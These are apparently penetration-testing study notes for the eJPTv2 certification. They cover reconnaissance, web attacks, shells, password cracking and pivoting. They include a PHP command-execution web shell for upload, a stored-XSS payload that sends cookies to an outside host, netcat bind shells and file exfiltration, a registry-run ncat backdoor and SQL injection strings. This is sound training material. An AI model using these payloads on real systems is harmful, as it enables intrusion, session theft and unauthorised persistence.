# eJPTv2 Notes

## Overview
Comprehensive notes for the eLearnSecurity Junior Penetration Tester v2 certification.

**Source**: [johnermac.github.io](https://johnermac.github.io/notes/ejpt/)

## Gather Information

### Google Dorking
```bash
site: <website>
```

### Tools
- DNSdumpster.com
- VirusTotal
- crt.sh (certificate search)

### Subdomain Enumeration
```bash
# Sublist3r
sublist3r -d <domain>

# Amass
apt-get install snapd
service snapd start
snap install amass
snap run amass -ip -d <domain>
```

## Port Scan

### Host Discovery
```bash
fping -a -g <host> 2>/dev/null
```

### Nmap
```bash
# Basic scan options
-sS    # Stealth scan (SYN scan)
-sT    # TCP scan (generates logs)
-sV    # Get versions (not as stealth but very useful)
-O     # Try to get OS
-iL    # Get hosts by file
-Pn    # Assumes all hosts are up and try to scan
-p     # Port
-A     # More profound scan

# Recommended approach
-sV -T4 -p-  # First scan all ports
-sV -T4 -p <the ports> -A > nmap.result  # Then detailed scan on found ports
```

## Vulnerability Scan

### Tools
- OpenVAS
- Nexpose
- GFI LAN Guard
- Nessus

**List of various vuln scanners**: https://sectools.org/tag/vuln-scanners/

## Web Scan

### Manual Fingerprint
```bash
# HTTP
nc <target> 80
HEAD / HTTP/1.0
<space>
<space>

# HTTPS
openssl s_client -connect <target>:443
HEAD / HTTP/1.0
```

### HTTP Print
```bash
httprint -P0 -h <target> -s <signature file>
-P0  # To avoid pinging the host
-h   # Target hosts
```

### HTTP PUT Method
```bash
# Count payload length
wc -m payload.php

# Upload via PUT
nc <target site> 80
PUT /payload.php HTTP/1.0
Content-Type: text/html
Content-length: 136  # Value from wc -m
```

**PHP shell code for PUT method**:
```php
<?php
if (isset($_GET['cmd']))
{
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
?>
```

After uploading, access: `?cmd=<command>`

### Netcat (NC)

**Send files**:
```bash
# Receiver
nc -lvnp <port> > output_file.txt

# Sender
echo 'hello' | nc -v <ip> <port>
# or
cat <file_u_Wanna_send> | nc -v <ip> <port>
```

### Bind Shell with Netcat
```bash
# Server/listener
nc -lvnp <port> -e /bin/bash

# Client/sender
nc -v <ip> <port>
```

### Dictionary-based Enumeration
Common backup file names: `.bak`, `.old`, `.txt`, `.xxx`

### DIRB
```bash
-x <file of extensions>
-X "extensions.bak, extensions.xxx"
-z delay in milliseconds
-o output a file
-p proxy
-H "set a header"
-u basic authentication "user:password"
-c "set a cookie"
-a "set a agent user"
```

### XSS (Cross-Site Scripting)

**Types**:
- Reflective - Can execute commands and get answer of output in the browser
- Stored - Can send files to the server / get cookies for others users and steal sessions

**Testing**:
```bash
# Try HTML command
<h1> teste </h1>

# Try JS command
<script>alert('XSS');</script>
```

**Payload to steal cookies (XSS Stored)**:
```javascript
<script>
var i = new Image();
i.src="http://192.168.99.11/get.php?cookies="+document.cookie; 
</script>
```

### MySQL Injection

**Blind SQL Injection**:
```bash
# Find first character
' or substr(user(), 1, 1) = 'a
' or substr(user(), 1, 1) = 'b

# Find second character
' or substr(user(), 2, 1) = 'a
```

### SQLMap
```bash
# Basic usage
sqlmap -u <URL> -p <injection parameter> [options]

# Example with UNION
sqlmap -u 'vulnerable url' -p id --technique=U

# With POST
sqlmap -u 'url' --data <post string> -p parameter [options]

# Options
-b              # Banner
--tables        # List tables
--current-db    # Current database
--columns       # List columns
--dump          # Dump data
-v3 --fresh-queries  # See what payload sqlmap used
--dbs           # See the databases available
--users         # See the users
-D              # Set the database of your choice
-T              # Set the tables of your choice
-C              # Set column of your choice
-r              # Request, we can get from burp
--technique=U   # UNION attack
--technique=B   # Boolean-based attacks
--flush-session # Clear the logs for a rerun test
```

## System Attacks

### Ncat
```bash
-l  # Listen
-e  # Execute file
-p  # Port
-v  # Verbose
```

### Backdoor (Windows)
1. Copy ncat (with the right OS version) to the target as `Windows\system32\winconfig.exe`
2. Go to regedit: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
3. New > String Value

### Meterpreter
```bash
# Basic commands
sysinfo
getuid
getsystem
hashdump
```

### John the Ripper
```bash
# Basic usage
john <hashfile>
john --wordlist=<wordlist> <hashfile>
john --format=<format> <hashfile>
```

### Hashcat
```bash
# Basic usage
hashcat -m <hash_mode> <hashfile> <wordlist>
hashcat -m 0 hashes.txt wordlist.txt  # MD5
hashcat -m 1000 hashes.txt wordlist.txt  # NTLM
```

## Network Attacks

### Shares

**Windows**:
```bash
# List shares
net view \\<target>
smbclient -L //<target> -N

# Access share
smbclient //<target>/<share> -N
```

**Linux**:
```bash
# Mount share
mount -t cifs //<target>/<share> /mnt/share -o username=<user>,password=<pass>
```

**Tools**:
- enum4linux
- smbmap
- crackmapexec

### ARP Spoofing
```bash
# arpspoof
arpspoof -i <interface> -t <target> <gateway>
```

## Meterpreter Advanced

### Pivot
```bash
# Add route
route add <subnet> <netmask> <session_id>

# Port forwarding
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
```

## Remote Code Execution

### With CURL
```bash
curl http://<target>/vulnerable.php?cmd=whoami
```

## Privilege Escalation

### PrivEsc WgelCTF

**Create shadow file**:
```bash
# Copy /etc/passwd
cp /etc/passwd /tmp/passwd

# Create new shadow entry
openssl passwd -1 -salt <salt> <password>

# Replace in shadow file
```

## Extra Notes

### Copy cat command
```bash
# Alternative to cat
less <file>
more <file>
head <file>
tail <file>
```

### Better shell
```bash
# Upgrade to TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with Ctrl+Z, then:
stty raw -echo; fg
```

### Gobuster - Web Enumeration
```bash
gobuster dir -u <url> -w <wordlist>
gobuster dir -u <url> -w <wordlist> -x php,html,txt
```

### SQLMap Advanced
```bash
# Use request file from Burp
sqlmap -r request.txt

# Custom injection point
sqlmap -r request.txt -p parameter
```

### GREP
```bash
# Search in files
grep -r "pattern" /path
grep -i "pattern" file.txt  # Case insensitive
grep -v "pattern" file.txt  # Invert match
```

### AUREPORT
```bash
# Audit report
aureport --summary
aureport -l  # Login events
aureport -au  # Authentication events
```

## Pivot

### Pivot with Chisel
```bash
# Server (attacker)
chisel server -p 8000 --reverse

# Client (target)
chisel client <attacker_ip>:8000 R:1080:socks
```

### Local Pivot
```bash
# SSH tunnel
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<target>
```

### Reverse SOCKS
```bash
# Using proxychains
proxychains <command>
```

## Tools Reference
- **Nmap** - Network scanning
- **Netcat** - Network utility
- **Burp Suite** - Web application security testing
- **SQLMap** - SQL injection exploitation
- **Metasploit** - Exploitation framework
- **John the Ripper** - Password cracking
- **Hashcat** - Advanced password recovery
- **Dirb** - Web content scanner
- **Gobuster** - Directory/file brute forcer
- **Chisel** - TCP/UDP tunnel

## Last Updated
December 2023

